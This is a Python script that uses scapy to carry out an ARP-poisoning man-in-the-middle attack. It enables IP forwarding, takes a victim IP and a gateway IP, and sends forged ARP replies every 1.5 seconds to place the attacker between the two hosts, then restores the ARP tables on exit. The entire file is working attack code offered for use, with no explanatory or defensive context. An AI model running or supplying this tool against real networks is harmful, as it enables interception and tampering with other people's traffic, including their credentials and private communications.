#!/usr/bin/python3

from scapy.all import *

from mitm import mitm_input


class Mitm:
    def __init__(self):
        try:
            self.enable_forwarding()
            self.interface = mitm_input.get_interface()
            self.victim_ip = mitm_input.get_victimIP()
            self.gate_ip = mitm_input.get_gateIP()
            self.victim_mac = self.get_mac(self.victim_ip)
            self.gate_mac = self.get_mac(self.gate_ip)
        except KeyboardInterrupt:
            self.mitm_shutdown()

    def enable_forwarding(self):
        print("\n[*] Enabling IP forwarding....\n")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    def disable_forwarding(self):
        print("[*] Disabling IP Forwarding...")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

    def mitm_shutdown(self):
        print("\n[*] User Requested Shutdown")
        print("[*] Exiting...")
        self.disable_forwarding()
        sys.exit(1)

    def get_mac(self, ip):
        return getmacbyip(ip)

    def re_arp(self):
        try:
            print("\n[*] Restoring Targets...")
            victim_mac = self.get_mac(self.victim_ip)
            gate_mac = self.get_mac(self.gate_ip)
            send(ARP(op=2, pdst=self.gate_ip, psrc=self.victim_ip,
                     hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=7)
            send(ARP(op=2, pdst=self.victim_ip, psrc=self.gate_ip,
                     hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gate_mac), count=7)
        except KeyboardInterrupt:
            self.mitm_shutdown()

    def trick(self, gm, vm):
        send(ARP(op=2, pdst=self.victim_ip, psrc=self.gate_ip, hwdst=vm))
        send(ARP(op=2, pdst=self.gate_ip, psrc=self.victim_ip, hwdst=gm))

    def mitm(self):
        try:
            self.victim_mac = self.get_mac(self.victim_ip)
        except Exception:
            print("[!] Couldn't Find Victim MAC Address")
            self.mitm_shutdown()
        try:
            self.gate_mac = self.get_mac(self.gate_ip)
        except Exception:
            print("[!] Couldn't Find Gateway MAC Address")
            self.mitm_shutdown()
        print("[*] Poisoning Targets...")
        while 1:
            try:
                self.trick(self.gate_mac, self.victim_mac)
                time.sleep(1.5)
            except KeyboardInterrupt:
                self.re_arp()
                break
        self.mitm_shutdown()


ob = Mitm()
ob.mitm()